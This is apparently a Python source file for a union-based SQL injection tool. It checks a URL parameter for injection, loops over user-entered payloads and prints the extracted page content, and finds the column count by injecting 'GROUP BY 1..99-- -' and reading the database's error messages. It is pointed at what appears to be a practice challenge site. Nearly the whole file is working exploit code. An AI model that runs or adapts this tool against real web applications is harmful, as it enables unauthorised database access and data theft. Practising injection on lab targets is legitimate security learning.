import requests
import validator.valid_checkers as valid
from bs4 import BeautifulSoup
import checker.searcher as checker
import colorama
import re
import urllib.parse

colorama.init(autoreset=True)


class Explotation:
    def __init__(self, site):
        self.site = site
        print("Checking site")
        self.is_vuln, self.msg, self.pattern, self.payload = checker.search_vuln(site, is_print=False, is_pattern=True)
        print(self.msg)
        self.site_for_req = site.split('=')
        self.nums_of_columns = None
        self.end_of_sql = None

    def get_content(self, html):
        soup = BeautifulSoup(html.text, 'lxml')
        all_data = soup.find_all(self.pattern)
        results = [data for num, data in enumerate(all_data[0].contents) if num % 2 == 1]
        return results

    def manual_exploit(self):
        if self.is_vuln:
            # print(self.msg)
            while True:
                payload = input("\nEnter payload: ")
                if payload == "0":
                    exit()
                else:
                    result = valid.check_res(self.site_for_req[0] + "=" + payload)
                    if len(result) == 4:
                        msg = f'{colorama.Fore.RED}{result[2]}'
                    elif len(result) == 3:
                        msg = f'{colorama.Fore.RED}{result[-1]} return 404'
                    else:
                        msg = colorama.Fore.RED + "\n".join(self.get_content(result[0]))
                    print(msg)
        else:
            print(self.msg)

    def print_columns(self):
        if self.is_vuln:
            if self.find_payload_and_columns():
                print(f'{colorama.Fore.LIGHTMAGENTA_EX}[+] Column count: {self.nums_of_columns}')
            else:
                print(f"{colorama.Fore.RED}Nums of columns not finded")
        else:
            print(f"{colorama.Fore.RED}Site is not vulnerability for union based SQLInj")

    def find_payload_and_columns(self):
        finded = False
        group_msg = "GROUP BY " + ",".join([str(i) for i in range(1, 100)])
        print("Finding nums of columns...")
        payloads, comment = ["", ")"], '-- -'
        for payl in payloads:
            res = requests.get(f"{self.site_for_req[0]}=-1{self.payload + payl}{group_msg}{comment}")
            if "Unknown column " in res.text:
                self.end_of_sql = self.payload + payl
                self.nums_of_columns = res.text.split("Unknown column '")[1].split("' in 'group")[0]
                finded = True
                break
        if self.nums_of_columns is None:
            res = requests.get(f"{self.site_for_req[0]}=-1 {group_msg}")
            if "Unknown column " in res.text:
                finded = True
                self.nums_of_columns = res.text.split("Unknown column '")[1].split("' in 'group")[0]
                self.end_of_sql = " "
        return finded


if __name__ == "__main__":
    # manual_exploit('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')
    # print(find_pattern("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'"))
    # print(get_content("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"))
    Explotation('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1').manual_exploit()
    # expl.print_columns()
